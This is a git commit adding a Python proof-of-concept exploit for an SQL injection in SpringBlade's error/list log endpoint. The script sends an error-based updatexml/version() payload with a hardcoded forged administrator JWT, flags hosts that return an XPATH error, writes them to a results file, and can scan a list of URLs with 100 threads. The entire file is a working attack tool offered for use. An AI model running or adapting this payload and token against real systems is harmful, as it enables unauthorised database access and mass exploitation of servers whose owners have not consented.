934a61e1479a8491b48d65d619e3107eec067a4d
huaiying666 <2929384884@qq.com>
2024-06-25 22:35:14 +0800

    Create SpringBlade error list SQL 注入漏洞.py

---
+++ SpringBlade error list SQL 注入漏洞/SpringBlade error list SQL 注入漏洞.py
@@ -0,0 +1,48 @@
+# SpringBlade error/list SQL 注入漏洞
+#导包
+import argparse,sys,requests,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()   #解除警告
+def poc(target):
+    url = target+"/api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1"
+    headers={
+            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+            "Content-Length":"0",
+            "Blade-Auth":"bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ",
+            }
+    try:
+        res = requests.get(url,headers=headers,verify=False,timeout=5)
+        if res.status_code==200 and "XPATH syntax error" in res.text:
+            print(f"[+] {target} 存在漏洞")
+            with open("result.txt", "a+", encoding="utf-8") as f:
+                f.write(target+"\n")
+        else:
+            print(f"[-] {target} 无")
+    except:
+        print(f"[*] {target} server error")
+def main():
+    #处理命令行参数
+    parser = argparse.ArgumentParser(description='')
+    #添加两个参数
+    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
+    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
+    #调用
+    args = parser.parse_args()
+    # 处理命令行参数了
+    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
+    # 反之开启多线程
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+if __name__ == '__main__':   #主函数入口
+    main()     #入口  main()
